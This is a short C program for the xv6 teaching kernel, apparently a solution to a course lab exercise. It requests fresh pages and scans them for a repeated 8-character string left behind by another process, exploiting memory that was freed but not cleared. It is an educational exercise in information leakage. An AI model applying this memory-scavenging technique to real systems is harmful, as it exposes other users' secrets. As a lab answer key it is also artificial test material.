#include "kernel/param.h"
#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int
main(int argc, char *argv[])
{
  char *mem_start;
  int found = 0;

  // Allocate many pages to hopefully get the one secret used
  mem_start = sbrk(80 * 4096);
  if(mem_start == (char*)-1){
    fprintf(2, "attack: sbrk failed\n");
    exit(0);
  }

  // The secret writes the string 8 times at offsets 0, 512, 1024, ...
  // Scan all pages looking for ANY 8-char alphanumeric strings
  for(int page = 0; page < 80 && !found; page++){
    char *mem = mem_start + (page * 4096);
    
    for(int i = 0; i < 4096 - 7; i++){
      // Look for start of alphanumeric string
      if((mem[i] >= 'a' && mem[i] <= 'z') || (mem[i] >= 'A' && mem[i] <= 'Z') || (mem[i] >= '0' && mem[i] <= '9')){
        // Count consecutive alphanumeric characters
        int len = 0;
        while(i + len < 4096 && len < 20 &&
              ((mem[i+len] >= 'a' && mem[i+len] <= 'z') || 
               (mem[i+len] >= 'A' && mem[i+len] <= 'Z') || 
               (mem[i+len] >= '0' && mem[i+len] <= '9'))){
          len++;
        }
        
        // Look for 8-character strings
        if(len >= 8){
          // Check if it repeats at +512
          int repeats = 0;
          for(int offset = 512; offset <= 3584; offset += 512){
            if(i + offset + 7 < 4096){
              int match = 1;
              for(int k = 0; k < 8; k++){
                if(mem[i+k] != mem[i+offset+k]){
                  match = 0;
                  break;
                }
              }
              if(match){
                repeats++;
              }
            }
          }
          
          // If it repeats at least 2 times (meaning 3 occurrences total), print it
          if(repeats >= 2){
            for(int k = 0; k < 8; k++){
              printf("%c", mem[i+k]);
            }
            printf("\n");
            found = 1;
            break;
          }
        }
      }
    }
  }

  if(!found){
    fprintf(2, "attack: secret not found\n");
  }

  exit(0);
}
